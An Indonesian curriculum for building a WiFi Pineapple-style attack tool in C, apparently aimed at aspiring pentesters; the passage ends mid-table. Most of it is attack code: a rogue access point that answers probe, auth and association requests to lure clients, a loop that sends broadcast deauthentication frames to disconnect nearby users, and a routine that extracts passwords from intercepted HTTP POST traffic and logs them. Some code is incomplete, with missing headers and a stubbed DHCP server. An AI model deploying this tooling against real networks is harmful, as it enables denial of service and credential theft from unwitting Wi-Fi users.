# 🍍 WiFi Pineapple: Makalah & Kurikulum Lengkap

**Versi:** 2.0  
**Tanggal:** 15 Agustus 2026  
**Penulis:** [Nama Anda]  
**Lisensi:** MIT  

---

## 📋 Daftar Isi

1. [Makalah WiFi Pineapple](#1-makalah-wifi-pineapple)
2. [Kurikulum Belajar](#2-kurikulum-belajar)
3. [Fase 0: Persiapan](#fase-0-persiapan-minggu-1)
4. [Fase 1: Rogue AP Basic](#fase-1-rogue-ap-basic-minggu-2-3)
5. [Fase 2: Attack Features](#fase-2-attack-features-minggu-4-5)
6. [Fase 3: Server Features](#fase-3-server-features-minggu-6-7)
7. [Fase 4: MITM & Advanced](#fase-4-mitm--advanced-minggu-8-10)
8. [Fase 5: Polish & Documentation](#fase-5-polish--documentation-minggu-11-12)
9. [Arsitektur Sistem](#9-arsitektur-sistem)
10. [Struktur Kode](#10-struktur-kode)
11. [Testing & Debugging](#11-testing--debugging)
12. [Referensi](#12-referensi)
13. [Lampiran](#13-lampiran)

---

## 1. Makalah WiFi Pineapple

### 1.1. Abstrak

WiFi Pineapple adalah alat penetration testing yang digunakan untuk membuat Rogue Access Point, menangkap kredensial, dan melakukan serangan Man-in-the-Middle (MITM). Proyek ini mengimplementasikan WiFi Pineapple dari nol menggunakan **Bahasa C** tanpa library eksternal, hanya mengandalkan **raw socket** dan **Netlink** bawaan Linux.

**Kata Kunci:** WiFi Pineapple, Rogue AP, Evil Twin, Karma Attack, Deauth Attack, MITM, C Programming, Raw Socket

---

### 1.2. Pendahuluan

#### 1.2.1. Latar Belakang

WiFi Pineapple dari Hak5 adalah alat yang sangat populer di kalangan security researcher. Harganya yang mahal (USD 199-499) mendorong kami untuk membuat versi open-source dengan fungsi serupa.

**Nama:** WiFi Pineapple  
**Pengembang:** Hak5  
**Tahun Rilis:** 2008 (generasi pertama)  
**Harga:** $199 - $499  
**Fungsi:** Penetration testing, WiFi security auditing

#### 1.2.2. Tujuan Proyek

1. Memahami cara kerja 802.11 protocol
2. Mengimplementasikan Rogue AP dari nol
3. Membangun multi-tool untuk penetration testing
4. Mengembangkan portfolio sebagai security engineer

#### 1.2.3. Ruang Lingkup Proyek

| Fase | Fitur | Target | Waktu |
|------|-------|--------|-------|
| **Fase 1** | Rogue AP dasar (beacon, probe, auth, assoc) | 500 lines | 2 minggu |
| **Fase 2** | Karma attack, Deauth attack, Multiple SSID | 800 lines | 2 minggu |
| **Fase 3** | DHCP server, DNS spoofing, Client tracking | 1250 lines | 2 minggu |
| **Fase 4** | MITM proxy, Credential capture, Web interface | 1950 lines | 3 minggu |
| **Fase 5** | Polish, Documentation, Demo | 2000+ lines | 2 minggu |

---

### 1.3. Fitur WiFi Pineapple (Hak5 vs Proyek Ini)

| Fitur | Hak5 Pineapple | Proyek Ini |
|-------|----------------|------------|
| **Harga** | $199-$499 | Gratis (Open Source) |
| **Hardware** | Custom board | Adapter WiFi + Linux |
| **OS** | Custom OpenWRT | Linux (Debian/Ubuntu) |
| **Rogue AP (Evil Twin)** | ✅ | ✅ |
| **Karma Attack** | ✅ | ✅ |
| **Deauth Attack** | ✅ | ✅ |
| **Multiple SSID** | ✅ | ✅ |
| **WPA Handshake Capture** | ✅ | ❌ (belum) |
| **DHCP Server** | ✅ | ✅ |
| **DNS Spoofing** | ✅ | ✅ |
| **MITM Proxy** | ✅ | ✅ |
| **Credential Capture** | ✅ | ✅ |
| **Web Dashboard** | ✅ | ✅ |
| **Module System** | ✅ | ❌ (belum) |
| **Filtering** | ✅ | ❌ (belum) |
| **Logging** | ✅ | ✅ |
| **Line Code** | ~50,000 | ~2,000 |

---

### 1.4. Teori Dasar WiFi Pineapple

#### 1.4.1. Cara Kerja Rogue AP

```
┌─────────────────────────────────────────────────────────────┐
│                    ROGUE AP (Evil Twin)                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Broadcast Beacon                                       │
│     "Saya AP dengan SSID FreeWiFi!"                        │
│                                                             │
│  2. Response Probe Request                                 │
│     Client: "Ada FreeWiFi?"                                │
│     AP Palsu: "Saya FreeWiFi!"                             │
│                                                             │
│  3. Authentication                                         │
│     Client: "Boleh connect?"                               │
│     AP Palsu: "Boleh!" (Open System)                       │
│                                                             │
│  4. Association                                            │
│     Client: "Saya mau join"                                │
│     AP Palsu: "Silahkan, AID=1"                            │
│                                                             │
│  5. CONNECTED ✅                                           │
│     Traffic client bisa di-intercept                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.2. Karma Attack

```
┌─────────────────────────────────────────────────────────────┐
│                    KARMA ATTACK                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Client broadcast probe request:                        │
│     "Ada AP bernama 'Indihome_1234'?"                      │
│                                                             │
│  2. Karma attack menjawab SEMUA probe:                     │
│     "Saya 'Indihome_1234'!"                                │
│                                                             │
│  3. Client auto-connect (karena pernah connect sebelumnya) │
│                                                             │
│  4. Client terkoneksi ke AP palsu kita                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.3. Deauth Attack

```
┌─────────────────────────────────────────────────────────────┐
│                    DEAUTH ATTACK                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Client connect ke AP asli "Kantin_WiFi"                │
│                                                             │
│  2. Kita kirim frame deauth ke client:                     │
│     "Kamu harus disconnect!"                               │
│                                                             │
│  3. Client disconnect dari AP asli                         │
│                                                             │
│  4. Client cari AP baru                                    │
│                                                             │
│  5. Karma attack: "Saya Kantin_WiFi!"                     │
│                                                             │
│  6. Client connect ke AP kita!                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.4. MITM (Man-in-the-Middle)

```
┌─────────────────────────────────────────────────────────────┐
│                    MITM ATTACK                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client → [AP Palsu] → [MITM Proxy] → [Internet]          │
│               ↓                            ↑               │
│          [Credential Capture]              │               │
│               ↓                            │               │
│          [Password Captured!]              │               │
│                                             │               │
│  Semua traffic HTTP bisa di-intercept                      │
│  - Login password                                           │
│  - Cookies                                                  │
│  - Form data                                                │
│  - Inject scripts                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. Kurikulum Belajar

### 2.1. Timeline 3 Bulan

```
Week 1:  Persiapan
         ↓
Week 2-3: Rogue AP Basic (500 lines) ✅
         ↓
Week 4-5: Attack Features (+300 lines) ✅
         ↓
Week 6-7: Server Features (+450 lines) ✅
         ↓
Week 8-10: MITM + Advanced (+700 lines) ✅
         ↓
Week 11-12: Polish & Documentation ✅

TOTAL: ~2000+ lines
```

### 2.2. Target Mingguan

| Minggu | Target | Output |
|--------|--------|--------|
| 1 | Environment ready | Linux + adapter |
| 2-3 | Rogue AP basic | SSID muncul + connect |
| 4-5 | Attack features | Karma + Deauth |
| 6-7 | Server features | DHCP + DNS |
| 8-10 | MITM + Web | Proxy + Dashboard |
| 11-12 | Polish | Documentation + Demo |

---

## Fase 0: Persiapan (Minggu 1)

### Tujuan:
- Memahami konsep dasar C
- Mengenal raw socket
- Setup environment Linux

### Materi Belajar:

| Hari | Topik | Durasi | Materi |
|------|-------|--------|--------|
| 1 | Install Linux (Ubuntu/Debian) | 2 jam | Dual boot atau VM |
| 2 | Belajar C: pointer, struct, socket | 4 jam | Buku "The C Programming Language" |
| 3 | Belajar 802.11 frame structure | 3 jam | Lihat file `802.11.md` |
| 4 | Setup TL-WN722N + monitor mode | 2 jam | `iw dev`, `ip link` |
| 5 | Test raw socket dengan tcpdump | 3 jam | `tcpdump -i wlan0 -e` |

### Output yang Diharapkan:

```bash
✅ Linux siap (Ubuntu 22.04 LTS)
✅ TL-WN722N terdeteksi (lsusb)
✅ Monitor mode berfungsi (iw dev)
✅ Raw socket berhasil (socket(AF_PACKET))
✅ tcpdump bisa capture frame 802.11
```

### Kode Pertama: `hello_wifi.c`

```c
// hello_wifi.c - Test raw socket
#include <stdio.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string.h>

int main() {
    // 1. Buat raw socket
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return 1;
    }
    printf("[+] Raw socket created: %d\n", sock);
    
    // 2. Bind ke interface wlan0
    struct ifreq ifr;
    struct sockaddr_ll addr;
    strcpy(ifr.ifr_name, "wlan0");
    ioctl(sock, SIOCGIFINDEX, &ifr);
    
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return 1;
    }
    printf("[+] Bound to wlan0\n");
    
    // 3. Capture 1 frame
    uint8_t buf[2048];
    int len = recv(sock, buf, sizeof(buf), 0);
    printf("[+] Captured %d bytes\n", len);
    
    close(sock);
    return 0;
}
```

### Compile & Test:

```bash
gcc -o hello_wifi hello_wifi.c
sudo ./hello_wifi
```

---

## Fase 1: Rogue AP Basic (Minggu 2-3)

### Tujuan:
- Membuat AP palsu yang bisa dilihat
- Handle probe request
- Handle auth & assoc

### Struktur Kode:

```
project/
├── main.c (50 lines)
├── rogue_ap.c (150 lines)
├── rogue_ap.h (20 lines)
├── sniffer.c (100 lines)
├── sniffer.h (15 lines)
├── utils.c (80 lines)
├── utils.h (15 lines)
└── config.h (30 lines)

TOTAL: ~500 lines
```

### Detail File:

#### `config.h` (30 lines)

```c
#ifndef CONFIG_H
#define CONFIG_H

#include <stdint.h>
#include <stdbool.h>

// Konstanta 802.11
#define IEEE80211_FTYPE_MGMT       0x00
#define IEEE80211_STYPE_BEACON     0x08
#define IEEE80211_STYPE_PROBE_REQ  0x04
#define IEEE80211_STYPE_PROBE_RESP 0x05
#define IEEE80211_STYPE_AUTH       0x0B
#define IEEE80211_STYPE_ASSOC_REQ  0x00
#define IEEE80211_STYPE_ASSOC_RESP 0x01

#define BEACON_INTERVAL            100
#define MAX_SSID_LEN               32
#define DEFAULT_CHANNEL            6

// Struktur konfigurasi
typedef struct {
    uint8_t bssid[6];
    char ssid[MAX_SSID_LEN];
    int channel;
    char monitor_iface[16];
    char ap_iface[16];
    bool use_virtual;
} ap_config_t;

#endif
```

#### `utils.h` (15 lines)

```c
#ifndef UTILS_H
#define UTILS_H

#include <stdint.h>
#include "config.h"

void mac_to_string(const uint8_t *mac, char *str);
int create_raw_socket(const char *iface);
int send_frame(int sock, const uint8_t *buf, int len, const char *iface);
void print_hex(const uint8_t *data, int len);

#endif
```

#### `utils.c` (80 lines)

```c
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    int ret = sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
    if (ret < 0) perror("sendto");
    return ret;
}

void print_hex(const uint8_t *data, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02x ", data[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}
```

#### `rogue_ap.h` (20 lines)

```c
#ifndef ROGUE_AP_H
#define ROGUE_AP_H

#include "config.h"

int build_beacon(uint8_t *buf, ap_config_t *cfg);
int send_beacon(ap_config_t *cfg);
int send_probe_response(ap_config_t *cfg, uint8_t *client_mac);
int send_auth_response(ap_config_t *cfg, uint8_t *client_mac);
int send_assoc_response(ap_config_t *cfg, uint8_t *client_mac);
int setup_ap_mode(const char *iface);

#endif
```

#### `rogue_ap.c` (150 lines)

```c
#include "rogue_ap.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>

int setup_ap_mode(const char *iface) {
    char cmd[256];
    printf("[+] Setting up AP mode on %s...\n", iface);
    
    snprintf(cmd, sizeof(cmd), "ip link set %s down", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iw dev %s set type ap", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "ip link set %s up", iface);
    system(cmd);
    
    return 0;
}

int build_beacon(uint8_t *buf, ap_config_t *cfg) {
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    // Frame Control: Beacon (0x8000)
    hdr->frame_control = htons(0x8000);
    hdr->duration = 0;
    memset(hdr->addr1, 0xFF, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    
    // Timestamp
    memset(pos, 0, 8); pos += 8;
    
    // Beacon Interval: 100 TU
    *pos++ = BEACON_INTERVAL & 0xFF;
    *pos++ = (BEACON_INTERVAL >> 8) & 0xFF;
    
    // Capability: ESS
    *pos++ = 0x01;
    *pos++ = 0x00;
    
    // SSID
    *pos++ = 0;
    *pos++ = strlen(cfg->ssid);
    memcpy(pos, cfg->ssid, strlen(cfg->ssid));
    pos += strlen(cfg->ssid);
    
    // Supported Rates
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    
    // Channel
    *pos++ = 3; *pos++ = 1; *pos++ = cfg->channel;
    
    return pos - buf;
}

int send_beacon(ap_config_t *cfg) {
    int sock;
    uint8_t buf[512];
    int len;
    
    sock = create_raw_socket(cfg->ap_iface);
    if (sock < 0) return -1;
    
    len = build_beacon(buf, cfg);
    int ret = send_frame(sock, buf, len, cfg->ap_iface);
    
    close(sock);
    return ret;
}

int send_probe_response(ap_config_t *cfg, uint8_t *client_mac) {
    int sock;
    uint8_t buf[512];
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    sock = create_raw_socket(cfg->ap_iface);
    if (sock < 0) return -1;
    
    hdr->frame_control = htons(0x5000);
    hdr->duration = 0;
    memcpy(hdr->addr1, client_mac, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    
    memset(pos, 0, 8); pos += 8;
    *pos++ = BEACON_INTERVAL & 0xFF;
    *pos++ = (BEACON_INTERVAL >> 8) & 0xFF;
    *pos++ = 0x01; *pos++ = 0x00;
    
    *pos++ = 0; *pos++ = strlen(cfg->ssid);
    memcpy(pos, cfg->ssid, strlen(cfg->ssid));
    pos += strlen(cfg->ssid);
    
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    
    *pos++ = 3; *pos++ = 1; *pos++ = cfg->channel;
    
    int len = pos - buf;
    int ret = send_frame(sock, buf, len, cfg->ap_iface);
    close(sock);
    return ret;
}

int send_auth_response(ap_config_t *cfg, uint8_t *client_mac) {
    int sock;
    uint8_t buf[256];
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    sock = create_raw_socket(cfg->ap_iface);
    if (sock < 0) return -1;
    
    hdr->frame_control = htons(0xB000);
    hdr->duration = 0;
    memcpy(hdr->addr1, client_mac, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    
    *pos++ = 0x00; *pos++ = 0x00; // Algorithm: Open
    *pos++ = 0x02; *pos++ = 0x00; // Sequence: 2
    *pos++ = 0x00; *pos++ = 0x00; // Status: Success
    
    int len = pos - buf;
    int ret = send_frame(sock, buf, len, cfg->ap_iface);
    close(sock);
    return ret;
}

int send_assoc_response(ap_config_t *cfg, uint8_t *client_mac) {
    int sock;
    uint8_t buf[256];
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    sock = create_raw_socket(cfg->ap_iface);
    if (sock < 0) return -1;
    
    hdr->frame_control = htons(0x1000);
    hdr->duration = 0;
    memcpy(hdr->addr1, client_mac, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    
    *pos++ = 0x01; *pos++ = 0x00; // Capability
    *pos++ = 0x00; *pos++ = 0x00; // Status: Success
    *pos++ = 0x01; *pos++ = 0x00; // AID: 1
    
    int len = pos - buf;
    int ret = send_frame(sock, buf, len, cfg->ap_iface);
    close(sock);
    return ret;
}
```

#### `sniffer.h` (15 lines)

```c
#ifndef SNIFFER_H
#define SNIFFER_H

#include "config.h"

int open_sniffer(const char *iface);
int handle_frame(uint8_t *buf, int len, ap_config_t *cfg);
void *sniff_thread(void *arg);

#endif
```

#### `sniffer.c` (100 lines)

```c
#include "sniffer.h"
#include "rogue_ap.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>

int open_sniffer(const char *iface) {
    int sock;
    struct ifreq ifr;
    struct sockaddr_ll addr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return -1;
    }
    
    return sock;
}

int handle_frame(uint8_t *buf, int len, ap_config_t *cfg) {
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    if (len < sizeof(wifi_header_t)) return -1;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint16_t fc = ntohs(hdr->frame_control);
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    
    if (type != IEEE80211_FTYPE_MGMT) return 0;
    
    char mac_str[18];
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
            hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
    
    switch(subtype) {
        case IEEE80211_STYPE_PROBE_REQ:
            printf("[Sniff] Probe Request from %s\n", mac_str);
            send_probe_response(cfg, hdr->addr2);
            break;
            
        case IEEE80211_STYPE_AUTH:
            printf("[Sniff] Authentication from %s\n", mac_str);
            send_auth_response(cfg, hdr->addr2);
            break;
            
        case IEEE80211_STYPE_ASSOC_REQ:
            printf("[Sniff] Association Request from %s\n", mac_str);
            send_assoc_response(cfg, hdr->addr2);
            printf("[+] Client CONNECTED: %s\n", mac_str);
            break;
    }
    
    return 0;
}

void *sniff_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    int sock;
    uint8_t buf[2048];
    
    printf("[Sniffer] Monitoring on %s\n", cfg->monitor_iface);
    
    sock = open_sniffer(cfg->monitor_iface);
    if (sock < 0) {
        fprintf(stderr, "[!] Failed to open sniffer\n");
        return NULL;
    }
    
    while (1) {
        int len = recv(sock, buf, sizeof(buf), 0);
        if (len < 0) {
            perror("recv");
            continue;
        }
        handle_frame(buf, len, cfg);
    }
    
    close(sock);
    return NULL;
}
```

#### `main.c` (50 lines)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include "config.h"
#include "rogue_ap.h"
#include "sniffer.h"
#include "utils.h"

volatile int running = 1;

void signal_handler(int sig) {
    running = 0;
}

int main() {
    ap_config_t cfg;
    pthread_t sniff_tid;
    char bssid_str[18];
    
    signal(SIGINT, signal_handler);
    
    // Setup konfigurasi
    cfg.bssid[0] = 0x02;
    cfg.bssid[1] = 0x11;
    cfg.bssid[2] = 0x22;
    cfg.bssid[3] = 0x33;
    cfg.bssid[4] = 0x44;
    cfg.bssid[5] = 0x55;
    strcpy(cfg.ssid, "FreeWiFi");
    cfg.channel = 6;
    strcpy(cfg.monitor_iface, "wlan0");
    strcpy(cfg.ap_iface, "wlan0");
    cfg.use_virtual = false;
    
    mac_to_string(cfg.bssid, bssid_str);
    
    printf("========================================\n");
    printf("  ROGUE AP - WiFi Pineapple Basic\n");
    printf("========================================\n");
    printf("SSID:    %s\n", cfg.ssid);
    printf("BSSID:   %s\n", bssid_str);
    printf("Channel: %d\n", cfg.channel);
    printf("========================================\n");
    
    // Setup AP mode
    setup_ap_mode(cfg.ap_iface);
    
    // Start sniffing thread
    pthread_create(&sniff_tid, NULL, sniff_thread, &cfg);
    
    // Beacon loop
    printf("[+] Rogue AP is running!\n");
    printf("[+] Press Ctrl+C to stop\n\n");
    
    while (running) {
        send_beacon(&cfg);
        usleep(100000); // 100ms
    }
    
    printf("\n[+] Stopping...\n");
    pthread_cancel(sniff_tid);
    pthread_join(sniff_tid, NULL);
    
    printf("[+] Done!\n");
    return 0;
}
```

### Compile & Test:

```bash
gcc -o rogue_ap main.c rogue_ap.c sniffer.c utils.c -pthread
sudo ./rogue_ap
```

---

## Fase 2: Attack Features (Minggu 4-5)

### Tujuan:
- Karma attack
- Deauth attack
- Multiple SSID

### Tambahan File:

```
project/
├── attack/
│   ├── karma.c (100 lines)
│   ├── karma.h (15 lines)
│   ├── deauth.c (100 lines)
│   └── deauth.h (15 lines)
```

### Kode Contoh: Deauth Attack

```c
// deauth.h
#ifndef DEAUTH_H
#define DEAUTH_H

#include "config.h"

int send_deauth_frame(uint8_t *client_mac, uint8_t *ap_mac, const char *iface);
void *deauth_thread(void *arg);

#endif
```

```c
// deauth.c
#include "deauth.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int send_deauth_frame(uint8_t *client_mac, uint8_t *ap_mac, const char *iface) {
    int sock;
    uint8_t buf[256];
    typedef struct {
        uint16_t frame_control;
        uint16_t duration;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint16_t seq_ctrl;
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    // Frame Control: Deauth (0xC000)
    hdr->frame_control = htons(0xC000);
    hdr->duration = 0;
    memcpy(hdr->addr1, client_mac, 6);
    memcpy(hdr->addr2, ap_mac, 6);
    memcpy(hdr->addr3, ap_mac, 6);
    hdr->seq_ctrl = 0;
    
    // Reason code: 7 = Class 3 frame from nonassociated STA
    *pos++ = 0x07;
    *pos++ = 0x00;
    
    int len = sizeof(wifi_header_t) + 2;
    int ret = send_frame(sock, buf, len, iface);
    close(sock);
    
    printf("[Deauth] Deauthenticated client\n");
    return ret;
}

void *deauth_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    // Deauth semua client di sekitar
    while (1) {
        // Broadcast deauth
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        send_deauth_frame(broadcast, cfg->bssid, cfg->ap_iface);
        sleep(5);
    }
    return NULL;
}
```

### Output yang Diharapkan:

```bash
✅ Karma: Client auto-connect ke AP kita
✅ Deauth: Client disconnect dari AP asli
✅ Multiple SSID: 10+ SSID muncul
```

---

## Fase 3: Server Features (Minggu 6-7)

### Tujuan:
- DHCP server
- DNS spoofing
- Client tracking

### Tambahan File:

```
project/
├── server/
│   ├── dhcp.c (200 lines)
│   ├── dhcp.h (20 lines)
│   ├── dns.c (150 lines)
│   └── dns.h (15 lines)
├── database/
│   └── client_tracker.c (100 lines)
```

### Kode Contoh: DHCP Server

```c
// dhcp.h
#ifndef DHCP_H
#define DHCP_H

#include "config.h"

int start_dhcp_server(const char *iface);
int handle_dhcp_request(uint8_t *data, int len);

#endif
```

```c
// dhcp.c (Simplified)
#include "dhcp.h"
#include <stdio.h>
#include <string.h>

int start_dhcp_server(const char *iface) {
    printf("[DHCP] Server started on %s\n", iface);
    // Setup IP: 192.168.1.1/24
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ip addr add 192.168.1.1/24 dev %s", iface);
    system(cmd);
    return 0;
}

int handle_dhcp_request(uint8_t *data, int len) {
    // Simulasi DHCP Offer
    printf("[DHCP] Request received\n");
    return 0;
}
```

### Output yang Diharapkan:

```bash
✅ Client dapat IP dari kita (192.168.1.x)
✅ DNS redirect ke IP kita (example.com -> 192.168.1.1)
✅ Client terdaftar di database
```

---

## Fase 4: MITM & Advanced (Minggu 8-10)

### Tujuan:
- HTTP proxy
- Capture credentials
- Web interface

### Tambahan File:

```
project/
├── mitm/
│   ├── proxy.c (300 lines)
│   ├── proxy.h (25 lines)
│   ├── capture.c (150 lines)
│   └── capture.h (15 lines)
├── web/
│   ├── web_ui.c (200 lines)
│   └── web_ui.h (20 lines)
```

### Kode Contoh: Capture POST Data

```c
// capture.c
#include "capture.h"
#include <stdio.h>
#include <string.h>

int capture_http(uint8_t *data, int len) {
    // Cari "POST" di data
    if (memmem(data, len, "POST", 4)) {
        // Cari "password="
        char *pwd = memmem(data, len, "password=", 9);
        if (pwd) {
            // Extract password sampai & atau space
            char password[256];
            int i = 0;
            while (pwd[i] != '&' && pwd[i] != ' ' && pwd[i] != '\r' && i < 255) {
                password[i] = pwd[i];
                i++;
            }
            password[i] = '\0';
            printf("[+] Password captured: %s\n", password);
            
            // Save to log
            FILE *fp = fopen("captured.txt", "a");
            if (fp) {
                fprintf(fp, "[%ld] %s\n", time(NULL), password);
                fclose(fp);
            }
        }
    }
    return 0;
}
```

### Output yang Diharapkan:

```bash
✅ Traffic HTTP terlihat di web dashboard
✅ Password login tercapture
✅ Web dashboard monitoring
✅ Report generation (CSV/TXT)
```

---

## Fase 5: Polish & Documentation (Minggu 11-12)

### Tujuan:
- Final testing
- Documentation
- Packaging

### Output yang Diharapkan:

```bash
✅ Semua fitur berjalan stabil
✅ Dokumentasi lengkap (README, API)
✅ Video demo (2-3 menit)
✅ GitHub repository
✅ Release v1.0
```

---

## 9. Arsitektur Sistem

### Diagram Arsitektur:

```
┌─────────────────────────────────────────────────────────────┐
│                      USER INTERFACE                         │
├─────────────────────────────────────────────────────────────┤
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐    │
│  │   Terminal   │  │  Web Dashboard│  │   Logging   │    │
│  └──────────────┘  └──────────────┘  └──────────────┘    │
├─────────────────────────────────────────────────────────────┤
│                      CORE ENGINE                            │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────┐   │
│  │              MAIN CONTROLLER                        │   │
│  ├─────────────────────────────────────────────────────┤   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌────────┐│   │
│  │  │ Sniffer │  │Broadcast│  │Attacker │  │ Server ││   │
│  │  │(Monitor)│  │  (AP)   │  │(Karma,  │  │(DHCP,  ││   │
│  │  └─────────┘  └─────────┘  │Deauth)  │  │ DNS)   ││   │
│  │                            └─────────┘  └────────┘│   │
│  └─────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────┤
│                    RAW SOCKET (Layer 2)                     │
├─────────────────────────────────────────────────────────────┤
│                    LINUX KERNEL (Netlink)                   │
└─────────────────────────────────────────────────────────────┘
```

### Komponen Sistem:

| Komponen | File | Fungsi |
|----------|------|--------|
| **Main Controller** | `main.c` | Entry point, orchestrator |
| **Sniffer** | `sniffer.c` | Sniff probe request |
